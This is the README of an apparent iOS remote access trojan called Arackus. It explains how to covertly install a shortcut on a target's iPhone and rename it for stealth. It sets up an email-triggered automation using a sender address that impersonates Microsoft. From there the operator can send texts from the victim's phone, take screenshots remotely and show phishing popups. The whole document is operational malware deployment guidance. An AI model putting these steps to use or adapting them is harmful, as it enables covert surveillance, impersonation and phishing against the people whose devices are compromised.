
# Arackus

Arackus is an iOS Remote Access Trojan (RAT) using the native mail and shortcut apps.

[![logo](https://i.ibb.co/G344QwLD/IMG-3312.jpg)](https://arackus.lovable.app)
# Adding Arackus Clients

1. Install [this shortcut](https://eclectic-capybara-98223e.netlify.app/ "this shortcut") onto the target device.
	>**Note:** You should probably change the name of the shortcut and/or icon for stealth.
3. ![settings](https://i.ibb.co/QvrdTKrw/IMG-2273.jpg)
4. Create a new email in the default mail app (not Gmail or anything else), or note the email that's already there.
5. Add a new shortcut automation.
6. Select email
7. Sender email:
```sh
auth.microsoft.no.reply@gmail.com
```
7. Subject contains:
```sh
🧞
```
9. Any acount, any recipient. Run **immediatly**.
9. Set it to run the shortcut.
10. In the clients tab, name the client and add the email address.
\
\
\
# Sending A Message
- Enter your message and who you want it to be sent to. Message mode is for phone numbers, contact is for the name of a contact.
	> They **need** to have the shortcut installed for this to work
- Generate a message code, and copy it
  > This is stored in the clipboard so don't copy anything else
- Find the client that will send the message
- Send.
	> This will send a message from the chosen client to the recipiant with whatever messege you want.

# Taking a Screenshot 
- Copy a screenshot code.
 > This is stored in the clipboard so don't copy anything else
- Find the client that will take the screenshot.
- Send.
- Go back to screenshot tab
- Show screenshot history

# Showing a Popup
- Set the name (eg. 'Malware detcted!'
- Enter url of html (eg. 'phising.com/malware-detected.html')
 > CSS wil render, but *not* JS, if your phishing requires JS, then use a link
 > Don't use window.open() because thats JS 